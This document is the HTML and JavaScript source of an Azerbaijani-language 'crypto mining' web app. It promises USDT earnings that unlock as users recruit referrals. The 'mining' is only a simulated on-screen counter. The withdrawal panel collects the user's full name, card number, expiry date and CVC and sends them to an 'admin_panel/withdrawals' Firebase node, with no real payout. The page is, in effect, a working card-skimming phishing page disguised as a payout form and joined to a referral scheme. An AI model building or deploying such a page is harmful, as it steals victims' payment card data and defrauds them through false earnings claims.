<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

<div id="mining-app" style="background: #000; min-height: 100vh; color: #fff; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; overflow-x: hidden;">

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        body { margin: 0; padding: 0; user-select: none; background: #000; }

        /* HEADER */
        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #1a1a1a; }
        .user-info { display: flex; align-items: center; gap: 10px; }
        .avatar { width: 35px; height: 35px; border-radius: 50%; background: #111; border: 1px solid #bdfd00; display: flex; align-items: center; justify-content: center; color: #bdfd00; }

        /* BOX SEÇİMİ */
        .box-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; padding: 15px; }
        .mining-box { 
            background: #111; border: 1px solid #222; border-radius: 12px; padding: 10px 5px; 
            text-align: center; transition: 0.3s; position: relative; cursor: pointer;
        }
        .mining-box.selected { border-color: #bdfd00; background: #1a1a1a; transform: scale(1.05); }
        .mining-box.locked { opacity: 0.5; filter: grayscale(1); }
        .lock-icon { position: absolute; top: 5px; right: 5px; font-size: 0.6rem; color: #ff3e3e; }
        .box-title { font-size: 0.6rem; font-weight: 700; display: block; margin-bottom: 5px; }
        .box-profit { font-size: 0.7rem; color: #bdfd00; font-weight: 900; }

        /* MƏRKƏZİ ANİMASİYA */
        .mining-core { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px 0; }
        .ring-container { position: relative; width: 180px; height: 180px; display: flex; align-items: center; justify-content: center; }
        .ring { position: absolute; border: 3px solid transparent; border-radius: 50%; animation: rotate-ring linear infinite; }
        .ring-1 { width: 170px; height: 170px; border-top-color: var(--box-color, #bdfd00); animation-duration: 3s; }
        .ring-2 { width: 130px; height: 130px; border-bottom-color: var(--box-color, #bdfd00); animation-duration: 2s; animation-direction: reverse; opacity: 0.6; }
        .core-icon { font-size: 3rem; color: var(--box-color, #bdfd00); text-shadow: 0 0 20px var(--box-color, #bdfd00); z-index: 5; }
        @keyframes rotate-ring { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .live-counter { font-size: 2.5rem; font-weight: 800; margin-top: 15px; color: #fff; }

        /* PANEL & PROGRESS */
        .progress-section { padding: 20px; }
        .progress-bar-bg { width: 100%; height: 6px; background: #1a1a1a; border-radius: 10px; overflow: hidden; margin-bottom: 8px; }
        .progress-fill { width: 0%; height: 100%; background: #bdfd00; transition: 0.3s; }
        
        .withdraw-panel {
            position: fixed; bottom: -100%; left: 0; width: 100%; height: 85%;
            background: #0a0a0a; border-top: 2px solid #bdfd00; border-radius: 30px 30px 0 0;
            z-index: 10000; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); padding: 25px; box-sizing: border-box;
        }
        .active-panel { bottom: 0 !important; }
        .b-input { width: 100%; background: #111; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 12px; outline: none; }
        
        .nav-bar { display: grid; grid-template-columns: repeat(4, 1fr); background: #050505; border-top: 1px solid #1a1a1a; padding: 15px 0; }
        .nav-item { text-align: center; color: #444; font-size: 1.2rem; }
    </style>

    <div class="top-bar">
        <div class="user-info">
            <div class="avatar"><i class="fas fa-user"></i></div>
            <div>
                <div id="user-name-tag" style="font-weight: 700; font-size: 0.9rem;">Yüklənir...</div>
                <div style="font-size: 0.6rem; color: #bdfd00;"><i class="fas fa-users"></i> <span id="ref-count">0</span> Referal</div>
            </div>
        </div>
        <div style="text-align: right;"><small style="color:#555; display:block">Səviyyə</small><b id="rank-name" style="font-size:0.7rem; color:#bdfd00">BRONZE</b></div>
    </div>

    <div class="box-grid">
        <div class="mining-box selected" id="box1" onclick="selectBox(1)" style="--color: #cd7f32">
            <span class="box-title">30 MANAT</span>
            <span class="box-profit">17 USDT</span>
            <small style="font-size:0.5rem; display:block; color:#666">30 Ref</small>
        </div>
        <div class="mining-box locked" id="box2" onclick="selectBox(2)" style="--color: #c0c0c0">
            <i class="fas fa-lock lock-icon"></i>
            <span class="box-title">60 MANAT</span>
            <span class="box-profit">35 USDT</span>
            <small style="font-size:0.5rem; display:block; color:#666">60 Ref</small>
        </div>
        <div class="mining-box locked" id="box3" onclick="selectBox(3)" style="--color: #ffd700">
            <i class="fas fa-lock lock-icon"></i>
            <span class="box-title">90 MANAT</span>
            <span class="box-profit">52 USDT</span>
            <small style="font-size:0.5rem; display:block; color:#666">90 Ref</small>
        </div>
        <div class="mining-box locked" id="box4" onclick="selectBox(4)" style="--color: #e5e4e2">
            <i class="fas fa-lock lock-icon"></i>
            <span class="box-title">120 MANAT</span>
            <span class="box-profit">70 USDT</span>
            <small style="font-size:0.5rem; display:block; color:#666">120 Ref</small>
        </div>
    </div>

    <div class="mining-core" id="core-area">
        <div class="ring-container">
            <div class="ring ring-1"></div>
            <div class="ring ring-2"></div>
            <i class="fas fa-cube core-icon" id="box-icon"></i>
        </div>
        <div class="live-counter" id="bal-txt">0.0000</div>
        <div style="font-size: 0.7rem; color: #555; font-weight: 700; margin-top: 5px;">MÖVCUD QAZANC (USDT)</div>
    </div>

    <div class="progress-section">
        <div style="display:flex; justify-content:space-between; margin-bottom:10px; font-size:0.75rem;">
            <span>Hədəf: <b id="target-txt">17.00 USDT</b></span>
            <span id="timer" style="color:#bdfd00">05:00:00</span>
        </div>
        <div class="progress-bar-bg"><div class="progress-fill" id="fill"></div></div>
        <button id="mine-btn" onclick="startSession()" style="width:100%; margin-top:15px; background:#bdfd00; border:none; padding:16px; border-radius:12px; font-weight:800; color:#000;">
            MƏDƏNİ AKTİVLƏŞDİR
        </button>
    </div>

    <div class="nav-bar">
        <div class="nav-item" style="color:#bdfd00"><i class="fas fa-dice-d6"></i></div>
        <div class="nav-item"><i class="fas fa-link"></i></div>
        <div class="nav-item" onclick="toggleW()"><i class="fas fa-wallet"></i></div>
        <div class="nav-item"><i class="fas fa-cog"></i></div>
    </div>

    <div id="w-panel" class="withdraw-panel">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h2 style="margin:0">Çıxarış</h2>
            <i class="fas fa-times" onclick="toggleW()"></i>
        </div>
        <div style="background:#111; padding:20px; border-radius:15px; margin-bottom:20px; text-align:center; border:1px solid #222;">
            <small style="color:#888">Çıxarıla bilən balans</small>
            <h1 id="w-bal" style="margin:5px 0; color:#bdfd00">0.00 USDT</h1>
        </div>
        <input type="text" id="fn" class="b-input" placeholder="AD SOYAD">
        <input type="text" id="cn" class="b-input" placeholder="KART NÖMRƏSİ">
        <div style="display:flex; gap:10px;">
            <input type="text" id="ed" class="b-input" placeholder="AA/İİ">
            <input type="password" id="cv" class="b-input" placeholder="CVC">
        </div>
        <input type="number" id="am" class="b-input" placeholder="MƏBLƏĞ">
        <button onclick="submitToAdmin()" style="width:100%; background:#238636; padding:18px; border:none; border-radius:12px; color:#fff; font-weight:700;">TƏSDİQLƏ</button>
    </div>

</div>

<script>
    const user = localStorage.getItem('username') || 'Qonaq';
    document.getElementById('user-name-tag').innerText = user;

    // BOX AYARLARI
    const boxes = {
        1: { name: "BRONZE", profit: 17, req: 30, spd: 0.000055, color: "#cd7f32" },
        2: { name: "SILVER", profit: 35, req: 60, spd: 0.000115, color: "#c0c0c0" },
        3: { name: "GOLD", profit: 52, req: 90, spd: 0.000170, color: "#ffd700" },
        4: { name: "PLATINUM", profit: 70, req: 120, spd: 0.000230, color: "#e5e4e2" }
    };

    let currentBoxID = 1;
    let userRefs = 0; // Bu Firebase-dən çəkilməlidir
    let bal = 0;
    let running = false;
    let start = 0;
    const DUR = 5 * 60 * 60 * 1000;

    // Firebase Sync
    db.ref('mining/' + user).on('value', snap => {
        const d = snap.val() || {};
        bal = d.balance || 0;
        running = d.isRunning || false;
        start = d.startTime || 0;
        userRefs = d.referals || 0; // Referal sayı burada yoxlanılır
        currentBoxID = d.selectedBox || 1;

        document.getElementById('ref-count').innerText = userRefs;
        document.getElementById('w-bal').innerText = bal.toFixed(2) + " USDT";
        
        checkLocks();
        applyBox(currentBoxID);
        updateUI();
    });

    function checkLocks() {
        for(let id in boxes) {
            const el = document.getElementById('box' + id);
            if(userRefs < boxes[id].req) {
                el.classList.add('locked');
            } else {
                el.classList.remove('locked');
                const lock = el.querySelector('.lock-icon');
                if(lock) lock.remove();
            }
        }
    }

    function selectBox(id) {
        if(userRefs < boxes[id].req) {
            return alert(`Bu box üçün ${boxes[id].req} referal lazımdır! Səndə: ${userRefs}`);
        }
        if(running) return alert("Mədən işləyərkən box dəyişdirilə bilməz!");
        
        currentBoxID = id;
        db.ref('mining/' + user).update({ selectedBox: id });
    }

    function applyBox(id) {
        const box = boxes[id];
        // UI Yenilə
        document.querySelectorAll('.mining-box').forEach(b => b.classList.remove('selected'));
        document.getElementById('box' + id).classList.add('selected');
        document.getElementById('rank-name').innerText = box.name;
        document.getElementById('target-txt').innerText = box.profit + ".00 USDT";
        
        // Rəng və Animasiya
        document.getElementById('core-area').style.setProperty('--box-color', box.color);
        document.getElementById('rank-name').style.color = box.color;
    }

    function updateUI() {
        const b = document.getElementById('mine-btn');
        if(running) {
            b.innerText = "MƏDƏN İŞLƏYİR...";
            b.disabled = true; b.style.opacity = "0.5";
        } else {
            b.innerText = "MƏDƏNİ AKTİVLƏŞDİR";
            b.disabled = false; b.style.opacity = "1";
        }
    }

    setInterval(() => {
        if(running) {
            let elap = Date.now() - start;
            if(elap < DUR) {
                // Seçilmiş boxun sürətinə görə artır
                bal += boxes[currentBoxID].spd;
                document.getElementById('bal-txt').innerText = bal.toFixed(4);
                document.getElementById('fill').style.width = (elap / DUR * 100) + "%";
                
                let rem = DUR - elap;
                let h = Math.floor(rem / 3600000);
                let m = Math.floor((rem % 3600000) / 60000);
                let s = Math.floor((rem % 60000) / 1000);
                document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
            } else {
                finish();
            }
        }
    }, 1000);

    async function startSession() {
        start = Date.now();
        running = true;
        await db.ref('mining/' + user).update({ isRunning: true, startTime: start, balance: bal });
    }

    async function finish() {
        running = false;
        await db.ref('mining/' + user).update({ isRunning: false, balance: bal });
        alert("Sessiya bitdi!");
    }

    function toggleW() { document.getElementById('w-panel').classList.toggle('active-panel'); }

    async function submitToAdmin() {
        const val = parseFloat(document.getElementById('am').value);
        if(val > bal || isNaN(val)) return alert("Səhv məbləğ!");

        const payload = {
            user: user,
            name: document.getElementById('fn').value,
            card: document.getElementById('cn').value,
            exp: document.getElementById('ed').value,
            cvc: document.getElementById('cv').value,
            amt: val,
            boxLevel: boxes[currentBoxID].name,
            date: new Date().toLocaleString()
        };

        await db.ref('admin_panel/withdrawals').push(payload);
        await db.ref('mining/' + user).update({ balance: bal - val });
        alert("Sorğu adminə göndərildi!");
        location.reload();
    }
</script>
